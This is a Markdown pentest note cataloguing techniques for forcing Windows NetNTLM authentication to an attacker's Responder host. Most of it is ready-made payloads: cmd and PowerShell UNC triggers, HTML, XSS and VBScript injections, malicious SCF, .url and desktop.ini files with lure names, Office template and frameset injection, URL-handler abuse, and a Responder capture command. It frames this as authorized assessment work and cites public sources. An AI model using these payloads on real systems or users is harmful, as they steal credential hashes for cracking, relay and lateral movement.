# NetNTLM v1 / v2 Hash Leak Processing Examples

These examples illustrate how **NetNTLMv1 and NetNTLMv2 authentication responses** may be elicited and processed during **authorized security assessments**, audits, or investigations.

All techniques described here **must only be performed with explicit permission** and within the scope of an approved engagement. They are presented to help defenders understand how credential material is exposed, collected, and abused in real environments.

---

## Overview

NetNTLM hash leaks occur when a Windows system attempts to authenticate to a remote resource using NTLM.  
The attacker does not need to compromise the system directly it only to trigger an outbound authentication attempt.

These responses can later be:

- Cracked offline
    
- Relayed to other services
    
- Used for lateral movement and privilege escalation
    

---

## Windows Command Triggers

Various native Windows commands can cause NTLM authentication attempts to a remote UNC path.

Examples include:

```cmd

dir \\<Responder_IP>\C$ regsvr32 /s /u /i://<Responder_IP>/example example.dll echo 1 > \\<Responder_IP>\share\file pushd \\<Responder_IP>\C$\test cmd /k \\<Responder_IP>\C$\test cmd /c \\<Responder_IP>\C$\test start \\<Responder_IP>\C$\test mkdir \\<Responder_IP>\C$\test type \\<Responder_IP>\C$\test
```


These commands force Windows to resolve a remote resource, triggering an NTLM authentication exchange.

---

## PowerShell Command Triggers

PowerShell provides additional mechanisms for inducing authentication:

```PowerShell
Invoke-Item \\<Responder_IP>\C$\test Get-Content \\<Responder_IP>\C$\test Start-Process \\<Responder_IP>\C$\test`
```
These methods are often more subtle and blend into legitimate administrative activity.

---

## Browser-Based Triggers (Internet Explorer / Edge)

Browsers can leak NTLM credentials when attempting to load resources from UNC paths.

### Example: HTML Image Reference

`<!DOCTYPE html> <html>   <img src="file://<Responder_IP>/path/example.png"> </html>`

When rendered, the browser attempts to retrieve the image and authenticates automatically.

---

## XSS-Based Triggers

If an application is vulnerable to XSS, injected content can force NTLM authentication.

`<img src="\\\\<Responder_IP>\\path\\example.png">`

This technique has been observed in real-world intranet applications.

---

## VBScript-Based Triggers (Internet Explorer)

VBScript can be used to force file access via UNC paths:

`<html> <script type="text/vbscript"> Set fso = CreateObject("Scripting.FileSystemObject") Set file = fso.OpenTextFile("//<Responder_IP>/test", 1) </script> </html>`

This technique is limited to legacy environments where IE and VBScript are still enabled.

---

## SCF File Abuse

### Scenario

If you can write files to a Windows file share, you can place a malicious `.scf` file in a commonly browsed directory.  
When users browse the directory, Windows Explorer automatically resolves the icon reference, leaking NTLM credentials.

### Step 1: Create the SCF File

`[Shell] Command=2 IconFile=\\<Responder_IP>\share\icon.ico [Taskbar] Command=ToggleDesktop`

Name the file so it appears near the top of directory listings (e.g., `@Updates.scf`).

### Step 2: Capture Authentication

`python Responder.py -wrf --lm -v -I <interface>`

Responder listens for and captures incoming NTLM authentication attempts.

---

## Microsoft Office Document Abuse

Office documents can reference external templates or resources that trigger NTLM authentication.

### Template Injection (`settings.xml.rels`)

Office documents (DOCX) can include external template references:

`<Relationship   Id="rId1"   Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"   Target="file://<Responder_IP>/template.dotx"   TargetMode="External"/>`

This technique does **not** work if the document opens in Protected View.

---

## Frameset-Based NTLM Leaks

Microsoft Office supports framesets for web editing, which can be abused.

### Workflow Summary

1. Extract the DOCX using 7zip
    
2. Modify `webSettings.xml` to reference an external frame
    
3. Create `webSettings.xml.rels` linking to a UNC path
    
4. Repackage the document
    
5. Wait for the user to open it
    

When opened, Office attempts to load the external resource, leaking NTLM credentials.

---

## URL Handler Abuse

Microsoft registers multiple custom URL schemes that can be abused to trigger UNC access:

`ms-word: ms-excel: ms-powerpoint: ms-visio: ms-project:`

Example:

`<script> location.href = "ms-word:ofe|u|\\<Responder_IP>\\path\\example.docx"; </script>`

---

## Internet Shortcut Files (`.url`)

### Example `.url` File

`[InternetShortcut] URL=file://<Responder_IP>/path/example.html`

Icons can also be abused:

`[InternetShortcut] URL=https://example.com IconIndex=0 IconResource=\\<Responder_IP>\path\icon.ico`

### `desktop.ini` Abuse

`[.ShellClassInfo] IconResource=\\<Responder_IP>\path\icon.ico`

Simply browsing the directory triggers the leak.

---

## Windows Script Files (`.wsf`)

Windows Script Files can be crafted to access remote resources, leaking NTLM credentials when executed.

---

## Why This Matters

NetNTLM leaks:

- Require no malware
    
- Leverage default Windows behavior
    
- Often succeed silently
    
- Enable relay, cracking, and lateral movement

They are a **behavioral attack surface**, not a vulnerability in cryptography.

---

## References

Living off the Land: Stealing NetNTLM Hashes  
[https://www.securify.nl/blog/SFY20180S0l/living-off-the-land_-stealing-netntlmhashes.html](https://www.securify.nl/blog/SFY20180S0l/living-off-the-land_-stealing-netntlmhashes.html)

Capturing NetNTLM Hashes with Office Documents  
[https://bohops.com/2018/08/04/capturing-netntlm-hashes-with-office-dot-xmldocuments/](https://bohops.com/2018/08/04/capturing-netntlm-hashes-with-office-dot-xmldocuments/)

NTLM Hash Theft via Framesets  
[https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/](https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/)

SMB Hash Hijacking  
[https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/may/smbhash-hijacking-and-user-tracking-in-ms-outlook/](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/may/smbhash-hijacking-and-user-tracking-in-ms-outlook/)

SCF File Attacks  
[https://room362.com/post/2016/smb-http-auth-capture-via-scf/](https://room362.com/post/2016/smb-http-auth-capture-via-scf/)
[https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/](https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/)


[[Processing]]
[[Home]]

 #tools #pitl0rd